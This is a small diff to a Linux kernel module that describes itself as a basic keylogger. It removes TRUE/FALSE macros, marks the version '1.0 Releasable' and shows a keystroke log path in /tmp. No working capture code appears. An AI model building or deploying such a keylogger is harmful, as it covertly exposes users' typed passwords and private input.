@@ -10,12 +10,6 @@
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
 #define CHRDEV_NAME "My Log Device"            // Use this macro to log the character device
 #define BUFF_SIZE 16                           // Size of the out buffer
-#ifndef TRUE
-#define TRUE 1
-#endif  // TRUE
-#ifndef FALSE
-#define FALSE 0
-#endif  // FALSE
 
 // LOGGING //
 #define DEF_LOG_FILENAME "/tmp/myKeyLog.txt"
@@ -758,4 +752,4 @@ module_exit(key_logger_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
 MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
-MODULE_VERSION("0.5"); // Not yet releasable
+MODULE_VERSION("1.0"); // Releasable
